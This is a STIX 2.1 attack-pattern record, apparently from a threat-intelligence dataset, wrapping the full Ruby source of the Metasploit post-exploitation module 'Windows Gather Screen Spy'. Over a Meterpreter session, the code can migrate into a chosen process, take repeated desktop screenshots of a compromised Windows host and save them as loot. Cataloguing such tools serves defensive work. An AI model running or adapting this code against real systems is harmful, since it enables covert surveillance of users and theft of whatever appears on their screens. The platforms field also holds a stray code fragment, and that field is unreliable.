{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--30ae3fdf-de12-4764-88b4-9f669ff9682f",
    "created": "2024-08-14T16:33:05.037282Z",
    "modified": "2024-08-14T16:33:05.037286Z",
    "name": "Windows Gather Screen Spy",
    "description": " This module will incrementally take desktop screenshots from the host. This allows for screen spying which can be useful to determine if there is an active user on a machine, or to record the screen for later data extraction.  Note: As of March, 2014, the VIEW_CMD option has been removed in favor of the Boolean VIEW_SCREENSHOTS option, which will control if (but not how) the collected screenshots will be viewed from the Metasploit interface.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/gather/screen_spy.rb",
            "external_id": "screen_spy.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'rbconfig'\n\nclass MetasploitModule < Msf::Post\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Gather Screen Spy',\n        'Description' => %q{\n          This module will incrementally take desktop screenshots from the host. This\n          allows for screen spying which can be useful to determine if there is an active\n          user on a machine, or to record the screen for later data extraction.\n\n          Note: As of March, 2014, the VIEW_CMD option has been removed in\n          favor of the Boolean VIEW_SCREENSHOTS option, which will control if (but\n          not how) the collected screenshots will be viewed from the Metasploit\n          interface.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Roni Bachar <roni.bachar.blog[at]gmail.com>', # original meterpreter script\n          'bannedit', # post module\n          'kernelsmith <kernelsmith /x40 kernelsmith /x2E com>', # record/loot support,log x approach, nx\n          'Adrian Kubok', # better record file names\n          'DLL_Cool_J' # Specify PID to migrate into\n        ],\n        'Platform' => ['win'], # @todo add support for posix meterpreter somehow?\n        'SessionTypes' => ['meterpreter'],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_migrate\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptInt.new('DELAY', [true, 'Interval between screenshots in seconds', 5]),\n        OptInt.new('COUNT', [true, 'Number of screenshots to collect', 6]),\n        OptBool.new('VIEW_SCREENSHOTS', [false, 'View screenshots automatically', false]),\n        OptBool.new('RECORD', [true, 'Record all screenshots to disk by saving them to loot', true]),\n        OptString.new('PID', [false, 'PID to migrate into before taking the screenshots', ''])\n      ]\n    )\n  end\n\n  def view_screenshots?\n    datastore['VIEW_SCREENSHOTS']\n  end\n\n  def record?\n    datastore['RECORD']\n  end\n\n  def run\n    host = session.session_host\n    screenshot = Msf::Config.config_directory + '/logs/' + host + '.jpg'\n\n    # If no PID is specified, don't migrate.\n    if datastore['PID'] != ''\n      migrate\n    end\n\n    if session.platform !~ /windows/i\n      print_error('Unsupported Platform')\n      return\n    end\n\n    begin\n      session.core.use('espia')\n    rescue ::Exception => e\n      print_error(\"Failed to load espia extension (#{e})\")\n      return\n    end\n\n    begin\n      count = datastore['COUNT']\n      print_status \"Capturing #{count} screenshots with a delay of #{datastore['DELAY']} seconds\"\n      # calculate a sane number of leading zeros to use.  log of x  is ~ the number of digits\n      leading_zeros = Math.log10(count).round\n      file_locations = []\n      count.times do |num|\n        select(nil, nil, nil, datastore['DELAY'])\n        begin\n          data = session.espia.espia_image_get_dev_screen\n        rescue Rex::Post::Meterpreter::RequestError => e\n          print_error(\"Error taking the screenshot: #{e.class} #{e} #{e.backtrace}\")\n          return false\n        end\n        if data\n          if record?\n            if framework.db.active\n              # let's loot it using non-clobbering filename, even tho this is the source filename, not dest\n              fn = \"screenshot.%0#{leading_zeros}d.jpg\" % num\n              file_locations << store_loot('screenspy.screenshot', 'image/jpg', session, data, fn, 'Screenshot')\n            else\n              print_error('RECORD flag specified however the database is not connected, so no loot can be stored!')\n              return false\n            end\n          end\n\n          # also write to disk temporarily so we can display in browser.\n          # They may or may not have been RECORDed.\n          # do this if they have not suppressed VIEW_SCREENSHOT display\n          if view_screenshots?\n            fd = ::File.new(screenshot, 'wb')\n            fd.write(data)\n            fd.close\n          end\n\n        end\n\n        if view_screenshots?\n          screenshot_path = \"file://#{screenshot}\"\n          Rex::Compat.open_browser(screenshot_path)\n        end\n      end\n    rescue IOError, Errno::ENOENT => e\n      print_error(\"Error storing screenshot: #{e.class} #{e} #{e.backtrace}\")\n      return\n    end\n    print_status('Screen Spying Complete')\n    if record? && framework.db.active && file_locations && !file_locations.empty?\n      print_status 'run loot -t screenspy.screenshot to see file locations of your newly acquired loot'\n    end\n\n    if view_screenshots?\n      # wait 2 secs so the last file can get opened before deletion\n      sleep 2\n      vprint_status \"Deleting temporary screenshot file: #{screenshot}\"\n      begin\n        ::File.delete(screenshot)\n      rescue StandardError => e\n        print_error(\"Error deleting the temporary screenshot file: #{e.class} #{e} #{e.backtrace}\")\n        print_error('This may be due to the file being in use if you are on a Windows platform')\n      end\n    end\n  end\n\n  def migrate\n    session.core.migrate(datastore['PID'].to_i)\n    print_good('Migration successful')\n    return datastore['PID']\n  rescue StandardError\n    fail_with(Failure::Unknown, 'Migration failed! Unable to take a screenshot under the desired process!')\n    return nil\n  end\nend\n",
    "x_mitre_platforms": [
        "['win'], # @todo add support for posix meterpreter somehow?"
    ]
}